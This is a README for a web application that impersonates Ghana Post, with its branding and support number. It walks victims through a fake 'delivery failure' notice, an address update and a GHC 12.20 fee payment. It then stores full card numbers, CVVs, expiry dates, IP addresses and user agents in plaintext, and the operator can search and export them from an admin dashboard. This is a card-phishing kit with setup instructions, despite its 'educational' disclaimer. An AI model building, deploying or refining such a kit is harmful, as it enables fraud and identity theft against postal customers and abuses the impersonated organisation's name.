# Ghana Post - Full Stack Application

A professional full-stack web application mimicking Ghana Post's delivery service system with a complete 3-step user flow and admin dashboard.

## 🏢 Features

### User Flow (3-Step Process)
1. **Delivery Status Page** - Display package tracking and delivery failure details
2. **Address Update Form** - Collect corrected delivery address information
3. **Payment Form** - Process delivery service fee payment (GHC 12.20)
4. **Success Page** - Confirmation message

### Admin Dashboard
- 🔐 Secure login system (username: `admin`, password: `ghanapost2024`)
- 📊 View all submissions with statistics
- 🔍 Search and filter by name, email, phone, package number
- 📅 Date range filtering
- 📥 Export submissions to CSV
- ✏️ Update submission status (pending/completed/flagged)
- 🗑️ Delete submissions
- 📋 Detailed submission information view

### Design
- Ghana Post red (#C40E2E) and white color scheme
- Professional, responsive design
- Mobile-friendly interface
- Professional postal service branding

## 🛠 Tech Stack

### Backend
- **Runtime**: Node.js
- **Framework**: Express.js
- **Database**: SQLite
- **Authentication**: JWT (JSON Web Tokens)
- **Password Hashing**: bcryptjs

### Frontend
- **Library**: React 18
- **Routing**: React Router v6
- **HTTP Client**: Fetch API
- **Styling**: CSS3 (custom, no frameworks)

## 📋 Project Structure

```
post/
├── client/                 # React Frontend
│   ├── public/
│   │   └── index.html
│   ├── src/
│   │   ├── components/
│   │   │   ├── Navbar.js
│   │   │   └── StepIndicator.js
│   │   ├── pages/
│   │   │   ├── DeliveryStatus.js     (Step 1)
│   │   │   ├── AddressForm.js        (Step 2)
│   │   │   ├── PaymentForm.js        (Step 3)
│   │   │   ├── SuccessPage.js
│   │   │   ├── AdminLogin.js
│   │   │   └── AdminDashboard.js
│   │   ├── styles/
│   │   │   └── index.css
│   │   ├── utils/
│   │   │   └── api.js                # API utilities
│   │   ├── App.js
│   │   └── index.js
│   ├── .env                          # Environment variables
│   └── package.json
│
└── server/                 # Express Backend
    ├── server.js                     # Main server file
    ├── submissions.db                # SQLite database (auto-created)
    ├── .env                          # Environment variables
    └── package.json
```

## 🚀 Setup Instructions

### Prerequisites
- Node.js (v14 or higher)
- npm or yarn

### Backend Setup

1. Navigate to server directory:
```bash
cd server
```

2. Install dependencies:
```bash
npm install
```

3. Create/verify `.env` file:
```
PORT=5000
JWT_SECRET=your-super-secret-jwt-key-change-in-production
ADMIN_USERNAME=admin
ADMIN_PASSWORD=ghanapost2024
NODE_ENV=development
```

4. Start the backend server:
```bash
npm start
```

Server will run on `http://localhost:5000`

### Frontend Setup

1. Navigate to client directory:
```bash
cd client
```

2. Install dependencies:
```bash
npm install
```

3. Create/verify `.env` file:
```
REACT_APP_API_URL=http://localhost:5000
```

4. Start the React app:
```bash
npm start
```

App will open at `http://localhost:3000`

## 📚 API Endpoints

### Public Endpoints
- `POST /api/submissions` - Submit form data and payment information

### Admin Endpoints (Require JWT Token)
- `POST /api/admin/login` - Admin authentication
- `GET /api/submissions` - Get all submissions
- `GET /api/submissions/:id` - Get single submission
- `GET /api/submissions/search` - Search submissions with filters
- `GET /api/submissions/export/csv` - Export submissions as CSV
- `PATCH /api/submissions/:id/status` - Update submission status
- `DELETE /api/submissions/:id` - Delete a submission

## 🔐 Security Features

- JWT-based authentication for admin routes
- Password stored in environment variables
- Basic input validation and sanitization
- SQLite database with structured schema
- CORS configuration
- IP address and user agent logging
- Card number validation (Luhn algorithm)
- Masked card display in admin panel

## 💾 Database Schema

### Submissions Table
```sql
CREATE TABLE submissions (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  packageNumber TEXT,
  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
  fullName TEXT,
  phoneNumber TEXT,
  email TEXT,
  streetAddress TEXT,
  city TEXT,
  region TEXT,
  postalCode TEXT,
  country TEXT,
  cardholderName TEXT,
  cardNumber TEXT,
  expiryDate TEXT,
  cvv TEXT,
  status TEXT DEFAULT 'pending',
  ipAddress TEXT,
  userAgent TEXT
)
```

## 🎨 Color Scheme

- **Ghana Red**: #C40E2E (Primary)
- **White**: #FFFFFF (Secondary)
- **Gray Light**: #F5F5F5 (Background)
- **Gray Dark**: #333333 (Text)
- **Success**: #28A745
- **Warning**: #FFC107

## 📝 Form Validation

### Address Form
- All fields required
- Email format validation
- Phone number validation

### Payment Form
- Card number validation (Luhn algorithm)
- Expiry date format (MM/YY)
- CVV 3-4 digit validation
- Cardholder name required

## 🧪 Testing the Application

1. **User Flow**:
   - Navigate to `http://localhost:3000`
   - Click "Continue" on delivery status page
   - Fill address form with valid data
   - Enter test credit card information
   - View success page

2. **Admin Dashboard**:
   - Click "Admin" in navbar or navigate to `/admin/login`
   - Login with credentials: `admin` / `ghanapost2024`
   - View all submissions
   - Use search/filter to find specific submissions
   - Export data to CSV
   - Update submission status

## 📱 Responsive Design

The application is fully responsive and works on:
- Desktop (1024px and above)
- Tablet (768px to 1023px)
- Mobile (below 768px)

## 🔄 Environment Variables

### Backend (.env)
```
PORT=5000
JWT_SECRET=your-secret-key
ADMIN_USERNAME=admin
ADMIN_PASSWORD=ghanapost2024
NODE_ENV=development
```

### Frontend (.env)
```
REACT_APP_API_URL=http://localhost:5000
```

## 📦 Dependencies

### Backend
- express@^4.18.2
- sqlite3@^5.1.6
- bcryptjs@^2.4.3
- jsonwebtoken@^9.0.2
- cors@^2.8.5
- dotenv@^16.3.1

### Frontend
- react@^18.2.0
- react-dom@^18.2.0
- react-router-dom@^6.16.0
- axios@^1.5.0 (alternative to fetch)

## 🚨 Important Notes

- The payment form is for demonstration only and does not process real payments
- Card numbers are stored in the database (in production, use tokenization)
- Admin password is stored in plaintext in .env (should be hashed in production)
- SQLite is used for simplicity (consider PostgreSQL for production)
- HTTPS should be enabled in production

## 📧 Support

For support or issues, contact Ghana Post Customer Service at +233 (0) 800 800 800

## 📄 License

This project is provided as-is for educational and demonstration purposes.
